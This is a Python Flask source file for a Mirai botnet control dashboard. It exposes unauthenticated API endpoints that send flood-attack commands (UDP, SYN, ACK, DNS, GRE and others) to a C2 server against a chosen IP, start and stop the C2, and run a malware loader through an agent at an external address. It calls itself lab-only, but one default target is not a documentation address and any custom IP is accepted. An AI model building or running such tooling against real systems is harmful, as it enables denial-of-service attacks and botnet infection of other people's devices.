#!/usr/bin/env python3
"""
Mirai Lab Dashboard — Flask API + static UI
Isolated research lab only. Does not ship Mirai attack logic; talks to local CNC.
"""

from __future__ import annotations

import os
import sys
from pathlib import Path

from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS

from cnc_client import default_client
import lab_control

ROOT = Path(__file__).resolve().parent
FRONTEND = ROOT.parent / "frontend"

app = Flask(__name__, static_folder=str(FRONTEND), static_url_path="")
CORS(app)
cnc = default_client()


@app.get("/")
def index():
    return send_from_directory(FRONTEND, "index.html")


@app.get("/api/health")
def health():
    return jsonify({"ok": True, "service": "mirai-lab-dashboard"})


@app.get("/api/status")
def status():
    return jsonify(cnc.refresh_status())


@app.get("/api/logs")
def logs():
    return jsonify({"logs": cnc.log.snapshot()})


@app.post("/api/command")
def command():
    data = request.get_json(silent=True) or {}
    cmd = (data.get("command") or "").strip()
    if not cmd:
        return jsonify({"ok": False, "error": "command required"}), 400
    result = cnc.run_command(cmd)
    return jsonify(result)


@app.post("/api/botcount")
def botcount():
    result = cnc.run_command("botcount")
    return jsonify(result)


@app.post("/api/attack")
def attack():
    """Preset lab attacks only (documentation IPs)."""
    data = request.get_json(silent=True) or {}
    target = (data.get("target") or "").lower()
    duration = int(data.get("duration") or 30)
    method = (data.get("method") or "udp").lower()
    dport = int(data.get("dport") or 80)

    lab_map = {
        "sg": os.environ.get("LAB_TARGET_SG", "203.0.113.100"),
        "kr": os.environ.get("LAB_TARGET_KR", "210.89.0.100"),
        "custom": (data.get("ip") or "").strip(),
    }
    ip = lab_map.get(target, "")
    if not ip:
        return jsonify({"ok": False, "error": "unknown target"}), 400

    # Mirai admin command shape: <method> <ip> <duration> [flags]
    if method not in ("udp", "syn", "ack", "stomp", "dns", "vse", "greip", "greeth", "udpplain"):
        method = "udp"

    cmd = f"{method} {ip} {duration} dport={dport}"
    result = cnc.run_command(cmd)
    result["command"] = cmd
    result["target_ip"] = ip
    return jsonify(result)


# --- Lab control (C2 local + Loader agent proxy) ---


@app.get("/api/lab/overview")
def lab_overview():
    return jsonify(lab_control.lab_overview())


@app.post("/api/lab/cnc/start")
def lab_cnc_start():
    return jsonify(lab_control.start_cnc())


@app.post("/api/lab/cnc/stop")
def lab_cnc_stop():
    return jsonify(lab_control.stop_cnc())


@app.post("/api/lab/http/start")
def lab_http_start():
    return jsonify(lab_control.loader_request("POST", "/http/start", {}))


@app.post("/api/lab/http/stop")
def lab_http_stop():
    return jsonify(lab_control.loader_request("POST", "/http/stop", {}))


@app.post("/api/lab/loader/run")
def lab_loader_run():
    data = request.get_json(silent=True) or {}
    return jsonify(lab_control.loader_request("POST", "/loader/run", data, timeout=20.0))


@app.get("/api/lab/loader/log")
def lab_loader_log():
    return jsonify(lab_control.loader_request("GET", "/loader/log", timeout=10.0))


@app.get("/<path:path>")
def static_proxy(path: str):
    return send_from_directory(FRONTEND, path)


def main() -> None:
    host = os.environ.get("DASH_HOST", "0.0.0.0")
    port = int(os.environ.get("DASH_PORT", "8080"))
    print(f"[dashboard] frontend={FRONTEND}", file=sys.stderr)
    print(f"[dashboard] http://{host}:{port}", file=sys.stderr)
    print(
        f"[dashboard] CNC={os.environ.get('CNC_HOST', '127.0.0.1')}:"
        f"{os.environ.get('CNC_PORT', '23')}",
        file=sys.stderr,
    )
    print(
        f"[dashboard] Loader agent={os.environ.get('LOADER_AGENT_URL', 'http://185.10.20.200:9090')}",
        file=sys.stderr,
    )
    app.run(host=host, port=port, debug=False, threaded=True)


if __name__ == "__main__":
    main()
